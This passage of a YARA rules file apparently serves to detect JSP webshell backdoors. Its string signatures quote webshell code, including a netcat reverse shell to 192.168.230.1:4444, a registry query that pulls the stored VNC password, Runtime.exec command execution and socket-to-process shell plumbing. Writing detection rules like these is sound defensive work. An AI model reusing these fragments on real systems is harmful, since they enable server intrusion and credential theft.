        hash37 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
        hash38 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
        hash39 = "ef63eb867061b4b442ec4dc81fe92db3f716da56b82ba14895979c3c0be569a6"
        hash40 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
        hash41 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
        hash42 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
        hash43 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
        hash44 = "19375141be573a9a01da3eeb26735ecdf7b7beafdbedbd8a0289e42bda552696"
        hash45 = "efe0746ae5723f3b9e4d83bbe5f65a1526ea9b42abc85883afb67e64a3697129"
        hash46 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
        hash47 = "0e373739c55c3a79f033d10214ad88a700c7d3ee862d35bf71d0c36578454277"
        hash48 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
        hash49 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
        hash50 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
        hash51 = "b9e52d41fa9d41dfaebad793ef99bda10c1f1c08fca43541b6d83c0e23cabddd"
        hash52 = "7fff522245c07cf0dc1a00f2650ff37b948337de5d93f58dca8825cea2de0442"
        hash53 = "a7fab64062972d0a6adb905d2b9aa3b193c48a4f951c6db370b1b809f25235f1"
        hash54 = "74168264a53223da64ade79b2083bfaf214fcf3d4a2853d74697d42af78165d0"
        hash55 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $x1 = "<option value=\\\"nc -e cmd.exe 192.168.230.1 4444\\\">nc</option>\"+" fullword ascii
        $s2 = "ins.put(\"executesql\",new ExecuteSQLInvoker());" fullword ascii
        $s3 = "<option value='reg query \\\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\RealVNC\\\\WinVNC4\\\" /v \\\"password\\\"'>vnc hash</option>\"+" fullword ascii
        $s4 = "Object obj = ((DBOperator)dbo).execute(sql);" fullword ascii
        $s5 = "ins.put(\"vLogin\",new VLoginInvoker());" fullword ascii
        $s6 = "(new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();" fullword ascii
        $s7 = "(new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();" fullword ascii
        $s8 = "ins.put(\"login\",new LoginInvoker());" fullword ascii
        $s9 = "out.println(\"<form action=\\\"\"+SHELL_NAME+\"\\\" method=\\\"post\\\" name=\\\"doForm\\\"></form>\"+" fullword ascii
        $s10 = "private static class ExecuteSQLInvoker extends DefaultInvoker{" fullword ascii
        $s11 = "var ie = window.navigator.userAgent.toLowerCase().indexOf(\\\"msie\\\") != -1;\"+" fullword ascii
        $s12 = "ins.put(\"shell\",new ShellInvoker());" fullword ascii
        $s13 = "if (session.getAttribute(PW_SESSION_ATTRIBUTE) == null || !(session.getAttribute(PW_SESSION_ATTRIBUTE)).equals(PW)) {" fullword ascii
        $s14 = "out.println(\"<form action=\\\"\"+SHELL_NAME+\"\\\" method=\\\"post\\\">\"+" fullword ascii
        $s15 = "out.println(\"<form action=\\\"\"+SHELL_NAME+\"\\\" method=\\\"POST\\\">\"+" fullword ascii
        $s16 = "\"<form name=\\\"form1\\\" id=\\\"form1\\\" action=\\\"\"+SHELL_NAME+\"\\\" method=\\\"post\\\" >\"+" fullword ascii
        $s17 = "out.println(\"<li><u>\"+Util.htmlEncode(name)+\" : </u>\"+Util.htmlEncode(pro.getProperty(name))+\"</li>\");" fullword ascii
        $s18 = "public OnLineConnector( InputStream is, OutputStream os ,String name,OnLineProcess ol){" fullword ascii
        $s19 = "out.println(\"<td nowrap>\"+meta.getColumnName(i)+\"<br><span>\"+meta.getColumnTypeName(i)+\"</span></td>\");" fullword ascii
        $s20 = "SHELL_NAME = request.getServletPath().substring(request.getServletPath().lastIndexOf(\"/\")+1);" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c or uint16(0) == 0x6f43 ) and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _1e79cae19d42da5aa9813b16456971b4e3d34ac0_b0bf32a5535c8815eff7429338d0111f2eef41ae_b4544b119f919d8cbf40ca2c4a7ab5c1a4da73a3__6
{
    meta:
        description = "jsp - from files 1e79cae19d42da5aa9813b16456971b4e3d34ac0.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ae77377b007733bb984ccf751ba2ba26a5befc293a2266ca00d7e53125299947"
        hash2 = "647e68c60293582c59b2e0c6fc8ee672293c731fbbda760dc2ab8ee767019e58"
        hash3 = "f13923c9a06e8526027e2ebf7f854dbee729b259f35e8c3813d6916a171044d4"
        hash4 = "0238225b83d37cc1259f83798f35b547a19179eb247beb9087d589bea7832f11"
    strings:
        $x1 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c net start\");  " fullword ascii
        $x2 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c tasklist /svc\");  " fullword ascii
        $x3 = "pro = Runtime.getRuntime().exec(\"cmd.exe /c netstat -an\");  " fullword ascii
        $x4 = "process = Runtime.getRuntime().exec(\"ipconfig /all\");// windows" fullword ascii
        $s5 = "<!-- saved from url=(0036)http://localhost:8080/test/shell.jsp -->" fullword ascii
        $s6 = "String exec = exeCmd(out,\"taskkill /f /pid \"+Pid);" fullword ascii
        $s7 = "out.print(\"<a href='?action=Z&command=netstart' target=FileFrame>" fullword ascii
        $s8 = "out.print(\"<a href='?action=Y&command=tasklist' target=FileFrame>" fullword ascii
        $s9 = "out.print(\"<a href='?action=B&command=netstat' target=FileFrame>" fullword ascii
        $s10 = "out.print(\"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + nowURI +\"\\\" />\\n\");" fullword ascii
        $s11 = "out.print(\"<TR><TD height=20><A href=\\\"?action=q\\\" target=FileFrame>" fullword ascii
        $s12 = "out.print(\"<TR><TD height=20><A href=\\\"?action=G\\\" target=FileFrame>" fullword ascii
        $s13 = "if(request.getParameter(\"pass\")!=null&&request.getParameter(\"pass\").equals(passWord)){" fullword ascii
        $s14 = "out.print(\"<TR><TD height=20><A href='?action=t' target=FileFrame>" fullword ascii
        $s15 = "out.print(\"<CENTER><A href=\\\"\\\" target=_blank><FONT color=red></FONT></CENTER></A>\");" fullword ascii
        $s16 = "</td><td>\"+System.getProperty(\"java.io.tmpdir\")+\"</td></tr>\");" fullword ascii
        $s17 = "res.setHeader(\"Content-disposition\",\"attachment;filename=\\\"\"+fName+\"\\\"\");" fullword ascii
        $s18 = "out.print(\"<A href='\"+\"javascript:JshowFolder(\\\"\"+convertPath(roots[i].getPath())+\"\\\")'>" fullword ascii
        $s19 = "public void pExeCmd(JspWriter out,HttpServletRequest request) throws Exception{" fullword ascii
        $s20 = "out.print(\"<INPUT class=c type=radio  value=\"+convertPath(roots[i].getPath())+\" name=radiobutton>\"+roots[i].getPath());" fullword ascii
    condition:
        ( uint16(0) == 0x213c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0bf6c1e069a14181eb642fa939a059efddc8c82e_275da720a99ed21fd98953f9ddda7460e5b96e5f_28f0cad6197cce10791a400a28f611b8400a8aec__7
{
    meta:
        description = "jsp - from files 0bf6c1e069a14181eb642fa939a059efddc8c82e.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b5886ba695f39bf801e5b47067cfcf983c645ccfcee6eee5292e7b911601f744"
        hash2 = "dc34856d6d9427af27e8e4369a3a3a333b90adc51482f8c497a1df8aa1e26e09"
        hash3 = "3b2498fbdba4ba0afa07db58bc7635bd32e6c89a5ce71a1e39941099b2d24247"
        hash4 = "11c6a21978abede258a86656ea665773ff5d126975a2389d6514a3f7f25507c1"
        hash5 = "235734c9bcff91f33a8430859299bd30489bf8865279f81571c571b9797d070f"
        hash6 = "ea0d67b44f2a604603176606bd47cb55845bf29b191564958ce9b9d2a33c63b9"
        hash7 = "b798b2eef87755b26b30e4d3483582adcc7d0a20d87cb78c8a9cd5c7a32d7730"
        hash8 = "c61303ebaa7234acd2aea6c5a7cb076c918938f2ace2a966d2dbe4382e766de0"
        hash9 = "7d0aedc6999a16e814f43f63617d4fbff0dc6c70ba4b67b2dd72ca00ad9099e1"
        hash10 = "ad54cd37b150597ec7032b391507addfb6b871711e5cbf28ccb213dd1855ef5c"
        hash11 = "a4306b23c0f066dbfbfc5a06d07b58081dd618fd5c95ec795cd3b8085bc80bd6"
        hash12 = "d29b790d8d6ec12f98f2bdaadd51232406e2a63885cc5ed302d105ff0361a0c3"
        hash13 = "5473f1edd8d2c8c37648cf0c64d805741f1cd867eeceb21850570d74851f0d78"
        hash14 = "31ce3b5fd44d13657926e93308d43fe0ef6c58559e50ba3029c6f97b35517f99"
    strings:
        $x1 = "_jshellContent = m.replaceAll(\"private String _password = \\\"\" + password + \"\\\"\");" fullword ascii
        $s2 = "p = Pattern.compile(\"private\\\\sString\\\\s_password\\\\s=\\\\s\\\"\" + _password + \"\\\"\");" fullword ascii
        $s3 = "_jshellContent = m.replaceAll(\"private int _sessionOutTime = \" + sessionTime);" fullword ascii
        $s4 = "public boolean DBInit(String dbType, String dbServer, String dbPort, String dbUsername, String dbPassword, String dbName) {" fullword ascii
        $s5 = "_jshellContent = m.replaceAll(\"private String _encodeType = \\\"\" + encodeType + \"\\\"\");" fullword ascii
        $s6 = "_dbConnection = DriverManager.getConnection(_url, User, Password);" fullword ascii
        $s7 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"2;url=\" + curUri + \"&curPath=\" + path + folderName + \"\\\" />\";" fullword ascii
        $s8 = "p = Pattern.compile(\"private\\\\sint\\\\s_sessionOutTime\\\\s=\\\\s\" + _sessionOutTime);" fullword ascii
        $s9 = "result = saveFile(curPath, request.getRequestURI() + \"?action=\" + action, fileContent);" fullword ascii
        $s10 = "sRet += \"<meta http-equiv=\\\"refresh\\\" content=\\\"0;url=\" + curUri + \"&curPath=\" + path + \"\\\" />\";" fullword ascii
        $s11 = "if (request.getParameter(\"password\") == null && session.getAttribute(\"password\") == null) {" fullword ascii
        $s12 = "result = saveAs(curPath, request.getRequestURI() + \"?action=\" + action, fileContent);" fullword ascii
        $s13 = "result = renameFile(curPath, request.getRequestURI() + \"?action=\" + action, Unicode2GB(file2Rename), Unicode2GB(newName));" fullword ascii
        $s14 = "public void setPassword(String password) throws JshellConfigException {" fullword ascii
        $s15 = "retStr = \"<font color=\\\"red\\\">bad command \\\"\" + cmd + \"\\\"</font>\";" fullword ascii
        $s16 = "p = Pattern.compile(\"private\\\\sString\\\\s_encodeType\\\\s=\\\\s\\\"\" + _encodeType + \"\\\"\");" fullword ascii
        $s17 = "_url = \"jdbc:odbc:dsn=\" + dbName + \";User=\" + dbUsername + \";Password=\" + dbPassword;" fullword ascii
        $s18 = "public String DBExecute(String sql) {" fullword ascii
        $s19 = "if (DBInit(dbType, dbServer, dbPort, dbUsername, dbPassword, dbName)) {" fullword ascii
        $s20 = "if (_dbStatement.execute(sql)) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _0d4b369f7cba724aaa4962caf463c5cfb915a141_4efa90145d62e21bfc37023580d455489ff1de37_5245173e6adf00979006ddc15710ed14366eec86__8
{
    meta:
        description = "jsp - from files 0d4b369f7cba724aaa4962caf463c5cfb915a141.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8f3cbb8d25d2371f2366f0cfbba3cb1e86dff7f5df90278be186abfc03d930be"
        hash2 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
        hash3 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
        hash4 = "7806a1b185b2dbb935880050d90ffdc502d5e6ac2b80950bced653f7e506aa00"
        hash5 = "50f7ee552bcb9706aedfdb3219dc340c9a6b3c451d0898b9d4c2ab1ffc14efb1"
        hash6 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
        hash7 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
        hash8 = "ef63eb867061b4b442ec4dc81fe92db3f716da56b82ba14895979c3c0be569a6"
        hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
        hash10 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
        hash11 = "0e373739c55c3a79f033d10214ad88a700c7d3ee862d35bf71d0c36578454277"
        hash12 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
        hash13 = "a7fab64062972d0a6adb905d2b9aa3b193c48a4f951c6db370b1b809f25235f1"
    strings:
        $x1 = "program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
        $x2 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=DataExport.txt\");" fullword ascii
        $s3 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,session);" fullword ascii
        $s4 = "((Invoker)ins.get(\"vLogin\")).invoke(request,response,JSession);" fullword ascii
        $s5 = "((Invoker)ins.get(\"login\")).invoke(request,response,session);" fullword ascii
        $s6 = "StreamConnector.readFromLocal(new DataInputStream(targetS.getInputStream()),new DataOutputStream(yourS.getOutputStream()));" fullword ascii
        $s7 = "(new StreamConnector(process.getErrorStream(), socket.getOutputStream())).start();" fullword ascii
        $s8 = "((Invoker)ins.get(\"vPortScan\")).invoke(request,response,JSession);" fullword ascii
        $s9 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"\"+(ISLINUX ? \"/bin/bash\" :" ascii
        $s10 = "((Invoker)ins.get(\"script\")).invoke(request,response,session);" fullword ascii
        $s11 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
        $s12 = "out.println(\" | <a href=\\\"javascript:new fso({path:'\"+Util.convertPath(f.getAbsolutePath())+\"'}).move()\\\">Move</a> | \"+" fullword ascii
        $s13 = "response.setHeader(\"Content-Disposition\",\"attachment;filename=\"+URLEncoder.encode(fileName,PAGE_CHARSET));" fullword ascii
        $s14 = "table.append(\"<b style='color:red;margin-left:15px'><i> View Struct </i></b> - <a href=\\\"javascript:doPost({o:'executesql'})" ascii
        $s15 = "response.setContentType(\"text/html;charset=\"+System.getProperty(\"file.encoding\"));" fullword ascii
        $s16 = "\\\\cmd.exe\")+\"\\\"/>\"+" fullword ascii
        $s17 = "out.println(\"<li style='list-style:none'><form action='\"+SHELL_NAME+\"' method='post'><fieldset>\"+" fullword ascii
        $s18 = "JSession.setAttribute(MSG,\"\\\"\"+JSession.getAttribute(ENTER).toString()+\"\\\" Is Not a Zip File. Please Exit.\");" fullword ascii
        $s19 = "targetS.connect(new InetSocketAddress(targetIP,Integer.parseInt(targetPort)));" fullword ascii
        $s20 = "out.println(\"<form action=\\\"\"+SHELL_NAME+\"\\\" id='refForm' method=\\\"post\\\">\"+" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _6cf0f458ae8faaabc449509d69531450b2067f3b_bcb6d19990c7eba27f5667d3d35d3a4e8a563b88_bdaf9279b3d9e07e955d0ce706d9c42e4bdf9aa1__9
{
    meta:
        description = "jsp - from files 6cf0f458ae8faaabc449509d69531450b2067f3b.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "43155417ae71646a6caa1151c865fd26c2ac8f333aa155123310e252c23f8827"
        hash2 = "3cae1bd3d766c1499b4689efd84bc45b12de8d6201041a029c71752c08429db3"
        hash3 = "488e17e55f6fd84cb138ad1350b7f3b2c5a8b82faf2e7903789d6d3c848f3883"
        hash4 = "de332d848f21bb342d5ebfdb351025e8705cd972a351fd88671a021a3bc0b893"
    strings:
        $x1 = "out.print(\"<td>SqlCmd:<input type=text name=sqlcmd title='select * from admin'><input name=run type=submit value=Exec></td>\"" fullword ascii
        $x2 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=T target=FileFrame>\"+ico(53)+\"SystemTools</a></td></tr>\");" fullword ascii
        $s3 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>OpenTheHttpProxy</a></td></tr>\");" fullword ascii
        $s4 = "out.print(\"<tr><td><a href='?Action=HttpProxy' target=FileFrame>CloseTheHttpProxy</a></td></tr>\");" fullword ascii
        $s5 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=S target=FileFrame>\"+ico(53)+\"SystemInfo(System.class)</a></td></tr>\");" fullword ascii
        $s6 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=L target=FileFrame>\"+ico(53)+\"ServletInfo</a></td></tr>\");" fullword ascii
        $s7 = "out.println(\"<tr><td bgcolor=menu><a href=?Action=i target=FileFrame>\"+ico(57)+\"Interfaces</a></td></tr>\");" fullword ascii
        $s8 = "out.println(\"<tr bgcolor=menu><td><a href=\\\"javascript:top.address.FolderPath.value='\"+folderReplace(f[i].getAbs" fullword ascii
        $s9 = "out.print(Runtime.getRuntime().availableProcessors()+\" <br>\");" fullword ascii
        $s10 = "out.print(\"<tr><form method=post action='?Action=IPscan'><td bordercolorlight=Black bgcolor=menu>Scan Port</td><td>IP:<input" fullword ascii
        $s11 = "con=DriverManager.getConnection(url,userName,passWord);" fullword ascii
        $s12 = "out.print(\"Driver:<input name=driver type=text>URL:<input name=conUrl type=text>user:<input name=user type=text size=3>passw" fullword ascii
        $s13 = "out.print(\"<tr><form method=post action='?Action=APIreflect'><td bordercolorlight=Black bgcolor=menu>Reflect API</td><td col" fullword ascii
        $s14 = "Process ps=rt.exec(file);" fullword ascii
        $s15 = "case 'I':scanPort(out,encodeChange(request.getParameter(\"IPaddress\")),Integer.parseInt(request.getParameter(\"startPo" fullword ascii
        $s16 = "out.print(\"<tr><td>DataBaseVersion:</td><td>\"+dbmd.getDatabaseProductVersion()+\"</td></tr>\");" fullword ascii
        $s17 = "out.print(\"<tr><form method=post action='?Action=newFolder'><td bordercolorlight=Black bgcolor=menu>Create folder</td><td co" fullword ascii
        $s18 = "out.print(\"<tr><td>\"+tableRs.getString(4)+\"</td><td>\"+tableRs.getInt(5)+\"</td><td>\"+tableRs.getString(6)+\"</td><td>\"" fullword ascii
        $s19 = "out.print(\"<tr><form method=post action='?Action=EditFile'><td bordercolorlight=Black bgcolor=menu>new file</td><td colspan=" fullword ascii
        $s20 = "out.print(\"<tr><td>\"+procRs.getString(3)+\"</td><td>\"+procRs.getString(7)+\"</td><td>\"+procRs.getShort(8)+\"</td></tr>\");" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _013f24efa637d00962abc741457f51a4ee64354c_48972f48f93f1cbdb0e4b95753da97ffdb58168f_b6eaf949b5037ce7ed2b16ed0752bc506b0664a2_10
{
    meta:
        description = "jsp - from files 013f24efa637d00962abc741457f51a4ee64354c.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4fe3fcf186c25821794594973184fe10443239023a5f1b58a4015b06bd938249"
        hash2 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
        hash3 = "c8c694306c27bfbe133f1694168f05026de575a94e2f63ba1fe65b46502c59e4"
    strings:
        $s1 = "UploadFile.uploadFile(request.getInputStream(), PAGE_ENCODING,Integer.parseInt(request.getHeader(\"Content-Length\")),path);" fullword ascii
        $s2 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+toPath+\"'});</script>\");" fullword ascii
        $s3 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+path+\"'});</script>\");" fullword ascii
        $s4 = "out.print(\"<script type=\\\"text/javascript\\\">post('\"+shellPath+\"',{'m':'FileManage','dir':'\"+ppath+\"'});</script>\");" fullword ascii
        $s5 = "webRootPath = Util.formatPath(this.getClass().getClassLoader().getResource(\"/\").getPath());" fullword ascii
        $s6 = "response.sendRedirect(shellPath+\"?m=Login&info=false\");" fullword ascii
        $s7 = "post('<%=shellPath%>',{'m':'FileManage','do':'newFile','path':currentDir,'isDir':isDir,'fileName':name});" fullword ascii
        $s8 = "String isLogin=session.getAttribute(\"isLogin\")+\"\";" fullword ascii
        $s9 = "final String shellPath=request.getContextPath()+request.getServletPath();" fullword ascii
        $s10 = "response.setHeader(\"Content-Disposition\", \"attachment; filename=\"+fname);" fullword ascii
        $s11 = "post('<%=shellPath%>',{'m':'FileManage','do':'packFiles','path':path,'files':pfs,'zipName':zipName});" fullword ascii
        $s12 = "ZipUtils.createZip(path, Util.formatPath(f.getParent())+\"/\"+zipName+\".zip\");" fullword ascii
        $s13 = "public static String getRequestStringVal(HttpServletRequest request,String key){" fullword ascii
        $s14 = "response.sendRedirect(shellPath+\"?m=Login\");" fullword ascii
        $s15 = "while (tmpString.indexOf(boundary.substring(0, boundary.length() - 2)) == -1) {" fullword ascii
        $s16 = "String contentDisposition = readLine(tmpBytes, readBytesLength, sis, encoding);" fullword ascii
        $s17 = "final String shellDir=webRootPath+request.getContextPath();" fullword ascii
        $s18 = "String webRootPath=request.getSession().getServletContext().getRealPath(\"/\");" fullword ascii
        $s19 = "public static int getRequestIntVal(HttpServletRequest request,String key){" fullword ascii
        $s20 = "if (tmpString.indexOf(boundary.substring(0, boundary.length() - 2)) == -1) {" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 8 of them ) ) or ( all of them )
}

rule _0317bd1d741350d9bc4adbf92801b6a109a57458_032c141019ceabee44e013e27d7e77bc4995125a_094b96e84e01793e542f8d045af68da015a4a7fc__11
{
    meta:
        description = "jsp - from files 0317bd1d741350d9bc4adbf92801b6a109a57458.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
        hash2 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
        hash3 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
        hash4 = "8f3cbb8d25d2371f2366f0cfbba3cb1e86dff7f5df90278be186abfc03d930be"
        hash5 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
        hash6 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
        hash7 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
        hash8 = "e68119870bc45d5cfda0a196d909288a48dc9ba4182596bfcc61939f79e47e7d"
        hash9 = "187900f5969d51b1e97b8fc86f285d903897663198aa50ce4bccb2d66f3058c8"
        hash10 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
        hash11 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
        hash12 = "3d192c949b8ae3da720884c66c19358246b46e38798bec40a1ad94da65a9034d"
        hash13 = "f91f6009cfee1189db44edcba85b2d9bad819331ee4e369cdcb4e21710c6768c"
        hash14 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
        hash15 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
        hash16 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
        hash17 = "df204c8c4accc4a508a86a91a63700ea4cf803dd273272c746f94a77ec933d23"
        hash18 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
        hash19 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
        hash20 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
        hash21 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
        hash22 = "04ceac0d310cde0e605e38d0e8b841d6f801b57cc6fef5ef7b792612db9acea8"
        hash23 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
        hash24 = "c13a5ec3d790bd79fd182c877b03092f4a80d9de9ea7487444a39b1dd52fc7e1"
        hash25 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
        hash26 = "7806a1b185b2dbb935880050d90ffdc502d5e6ac2b80950bced653f7e506aa00"
        hash27 = "50f7ee552bcb9706aedfdb3219dc340c9a6b3c451d0898b9d4c2ab1ffc14efb1"
        hash28 = "9f3b666adc648f9ef129f2862b3d88e1c0f05bd04577df0af59b23adae302406"
        hash29 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
        hash30 = "ab9fd7ec29a69d4caa54c063c86d02f334ae1add49b0acd42a4afdfd05cb7ae0"
        hash31 = "20439a4058bb68ba1973e780a51942a19e775f665ea241d8d667afe4f2c49b1a"
        hash32 = "e2daa70b1cbb80911d9c2f48bb527ef64ef55995938cb12beb820e890dd30240"
        hash33 = "84588230bd7d4dbfd3c3544c54e31a0348c614b6c9ad2fd78334cc04dbf16164"
        hash34 = "8aa5dca21b414254d8f772487dd8569b0753813535b3ce1430609f9e52f3fe4c"
        hash35 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
        hash36 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
        hash37 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
        hash38 = "9907c1f10ca7ddde1c8f9a652506737b86e60eb8b537c8a42d4fad55e199d3a7"
        hash39 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
        hash40 = "6772b3f0fcf087e3cd64979b34a547897bbd199b314a41d1478ad400314cd0d2"
        hash41 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
        hash42 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
        hash43 = "ef63eb867061b4b442ec4dc81fe92db3f716da56b82ba14895979c3c0be569a6"
        hash44 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
        hash45 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
        hash46 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
        hash47 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
        hash48 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
        hash49 = "19375141be573a9a01da3eeb26735ecdf7b7beafdbedbd8a0289e42bda552696"
        hash50 = "efe0746ae5723f3b9e4d83bbe5f65a1526ea9b42abc85883afb67e64a3697129"
        hash51 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
        hash52 = "0e373739c55c3a79f033d10214ad88a700c7d3ee862d35bf71d0c36578454277"
        hash53 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
        hash54 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
        hash55 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
        hash56 = "b9e52d41fa9d41dfaebad793ef99bda10c1f1c08fca43541b6d83c0e23cabddd"
        hash57 = "7fff522245c07cf0dc1a00f2650ff37b948337de5d93f58dca8825cea2de0442"
        hash58 = "a7fab64062972d0a6adb905d2b9aa3b193c48a4f951c6db370b1b809f25235f1"
        hash59 = "74168264a53223da64ade79b2083bfaf214fcf3d4a2853d74697d42af78165d0"
        hash60 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $x1 = "Process pro = Runtime.getRuntime().exec(command);" fullword ascii
        $s2 = "Process pro = Runtime.getRuntime().exec(program);" fullword ascii
        $s3 = "Process process = Runtime.getRuntime().exec(program);" fullword ascii
        $s4 = "Process pro = Runtime.getRuntime().exec(exe);" fullword ascii
        $s5 = "out.println(\"<li><u>\"+Util.htmlEncode(en.getKey())+\" : </u>\"+Util.htmlEncode(en.getValue())+\"</li>\");" fullword ascii
        $s6 = "program = \"cmd.exe\";" fullword ascii
        $s7 = "private static class VLoginInvoker extends DefaultInvoker {" fullword ascii
        $s8 = "Object online = JSession.getAttribute(SHELL_ONLINE);" fullword ascii
        $s9 = "Object remotePort = JSession.getAttribute(\"remotePort\");" fullword ascii
        $s10 = "private OnLineProcess ol = null;" fullword ascii
        $s11 = "Object o = JSession.getAttribute(SHELL_ONLINE);" fullword ascii
        $s12 = "private static final String SHELL_ONLINE = \"SHELL_ONLINE\";" fullword ascii
        $s13 = "private static class VPortScanInvoker extends DefaultInvoker {" fullword ascii
        $s14 = "private static class PortScanInvoker extends DefaultInvoker {" fullword ascii
